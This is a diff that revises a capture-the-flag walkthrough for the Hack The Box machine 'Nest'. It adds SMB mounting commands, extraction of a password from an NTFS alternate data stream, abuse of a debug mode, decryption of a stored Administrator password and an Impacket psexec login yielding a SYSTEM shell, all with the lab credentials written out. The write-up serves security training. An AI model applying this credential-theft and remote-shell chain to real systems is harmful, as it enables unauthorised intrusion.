@@ -155,7 +155,7 @@ IT/Configs/RU Scanner/RU_config.xml:  <Username>c.smith</Username>
 
 The config.xml for Notepad++ shows us a path to his todo list.
 
-Let's open the file to take a closer look. The file history offers useful information.
+Let's open the file to take a closer look. 
 
 ```
 root@kali:/mnt/Data/IT/Configs# cat NotepadPlusPlus/config.xml
@@ -167,12 +167,21 @@ root@kali:/mnt/Data/IT/Configs# cat NotepadPlusPlus/config.xml
 </History>
 </SNIP>
 ```
+The file history offers useful information. In particular, it offers us visibility into the `Secure$` share. We now know that there is a `\IT\Carl` path within it.
 
 ### Accessing Folders Without Listing Permissions
 
+We did not know of this path earlier because we couldn't list the contents of the IT folder. Now that we are aware, let's try to access it.
 
+After mounting it, we list its contents recursively.
+
+`ls -alR *`
+
+There are a number of files to look through, but let's see if we can find anything related to the password we found earlier.
 
 ### Reading Code
+
+To do so, we grep for `password`.
 
 ```
 root@kali:/mnt/Secure/Carl# grep -ir password
@@ -181,9 +190,9 @@ VB Projects/WIP/RU/RUScanner/Module1.vb:        Dim test As New SsoIntegration W
 <SNIP>
 ```
 
-Module1.vb tells us that it is using Utils.DecryptString for decrypting the password.
+Module1.vb tells us that it is using Utils.DecryptString to decrypt the password.
 
-We found Utils.vb in the same folder. Inspecting it reveals that it contains the decryption function.
+Utils.vb is in the same folder. Upon inspection, we find the decryption function.
 
 ```
 <SNIP>
@@ -206,7 +215,7 @@ The next step is to recover the password.
 
 ## Decrypting The Password
 
-To recover the encrypted password, let's run the decryption VB code we found in the Secure$ share.
+To recover the encrypted password, let's run the decryption function we found in the Secure$ share.
 
 [Visual Studio](https://visualstudio.microsoft.com/) is the easiest way to work with .NET code.
 
@@ -240,19 +249,84 @@ Recovered credentials for **c.smith**.
 
 With this set of credentials, the first place to check is c.smith's folder in the Users share.
 
-blah blah
+```
+root@kali:/mnt# mount -t cifs -o username=c.smith //10.10.10.178/Users /mnt/Users
+Password for c.smith@//10.10.10.178/Users:  ******************
 
-This seems like a password we can use on the HQK service.
+root@kali:/mnt/Users# cd C.Smith
+root@kali:/mnt/Users/C.Smith# ls
+'HQK Reporting'   user.txt
+root@kali:/mnt/Users/C.Smith# cd 'HQK Reporting'/
+root@kali:/mnt/Users/C.Smith/HQK Reporting# ls
+'AD Integration Module'  'Debug Mode Password.txt'   HQK_Config_Backup.xml
+```
+
+We got **user.txt.**.
+
+We also find `Debug Mode Password.txt`, which however appears to be empty.
+
+NTFS supports [forks](https://en.wikipedia.org/wiki/Fork_(file_system)) in the form of Alternate Data Steam (ADS). These streams offer ways to store data that do not show up in a superficial inspection.
+
+Using smbclient, we can check if there are alternate streams of data.
+
+```
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+altname: DEBUGM~1.TXT
+create_time:    Fri Aug  9 06:06:12 AM 2019 +07
+access_time:    Fri Aug  9 06:06:12 AM 2019 +07
+write_time:     Fri Aug  9 06:08:17 AM 2019 +07
+change_time:    Fri Aug  9 06:08:17 AM 2019 +07
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+```
+
+The main data steam is empty but we find 15 bytes of data in a second data stream. 
+
+By default, when we download a file using smbclient, it gets only the main data stream. Hence, to get the alternate data stream, we need to specify the stream after the filename using `get`.
+
+```
+smb: \C.Smith\HQK Reporting\> get DEBUGM~1.TXT:Password:$DATA debug.txt
+getting file \C.Smith\HQK Reporting\DEBUGM~1.TXT:Password:$DATA of size 15 as debug.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+
+Now, when we look into the file, it contains a password we can use on the HQK service.
+
+* HQK DEBUG Password: WBQ201953D8w  
 
 ## HQK Enumeration
 
 Our port scan grabbed the HQK banner which includes a list of available commands. We can use them to perform recon.
 
-First, use telnet to connect to port 4386.
+First, let's connect to the HQK service with telnet.
 
-Without any existing credentials, a good first step is to try the default credentials, if any.
+`telnet 10.10.10.178 4386`
 
-According to the [documentation here](https://documentation.centreon.com/docs/centreon/en/19.04/installation/from_VM.html), the default login is **admin** with the password **centreon**.
+```
+HQK Reporting Service V1.2
+
+>DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+>HELP
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+```
+
+Using our debug password, we locked a few additional commands. The `SHOWQUERY` command is helpful as it allows us to look inside files.
+
+With it, we can show the contents of this LDAP configuration file we find.
 
 ```
 QUERY FILES IN CURRENT DIRECTORY
@@ -270,11 +344,13 @@ User=Administrator
 Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
 ```
 
+Looks like we got another password, this time for the Administrator account.
+
 ## Recovering Another Encrypted Password
 
 The password in Ldap.conf looks like the encrypted password we found earlier in RU_config.xml.
 
-However, trying to decrypt it using the same program returned an error.
+However, trying to decrypt it in the same way returned an error.
 
 ```
 System.Security.Cryptography.CryptographicException
@@ -287,11 +363,22 @@ System.Security.Cryptography.CryptographicException
 
 It probably means that we are not decrypting it the same way as it was encrypted.
 
-This encrypted password is in a file for LDAP configuration, implying that the key to decrypting this password is in a LDAP program. The obvious candidate here is the **HqkLdap.exe** software found in the same folder.
+This encrypted password comes from a file for LDAP configuration, implying that the key to decrypting this password is in a LDAP program. The obvious candidate here is the **HqkLdap.exe** software found in the same folder.
 
 Although we cannot download files using the HQK service, recall that we came across this file in our earlier recon of c.smith's folder. So let's return to the SMB share and download the the binary.
 
---insert command for downloading
+```
+smbclient \\\\10.10.10.178\\Users -U c.smith
+Enter WORKGROUP\c.smith's password: 
+<SNIP>
+smb: \c.smith\HQK Reporting\AD Integration Module\> ls
+  .                                   D        0  Fri Aug  9 19:18:42 2019
+  ..                                  D        0  Fri Aug  9 19:18:42 2019
+  HqkLdap.exe                         A    17408  Thu Aug  8 06:41:16 2019
+
+		10485247 blocks of size 4096. 6545527 blocks available
+smb: \c.smith\HQK Reporting\AD Integration Module\> get HqkLdap.exe
+```
 
 ### Decompiling .NET executable
 
@@ -336,13 +423,22 @@ Run the program again and you'll find the decrypted password.
 
 ## Getting A Root Shell
 
-psexec
+With the decrypted password, let's get a system shell with Impacket's psexec.
 
+```
+root@kali:~/htb/nest# ./psexec.py Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.178.....
+<SNIP>
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
 ## Ending Thoughts
 
-This box is fun. In particular, it's a great box to learn about SMB enumeration.
+This box is fun. In particular, it's a great box to practise about SMB enumeration.
 
-https://www.darkreading.com/safely-storing-user-passwords-hashing-vs-encrypting/a/d-id/1269374
-not a good idea to encrypt
-
-https://dotnetfiddle.net/
+* The passwords used are strong. If the passwords were hashed, we might not have such an easy time. [Good read on hashing versus encrypting passwords.](https://www.darkreading.com/safely-storing-user-passwords-hashing-vs-encrypting/a/d-id/1269374)
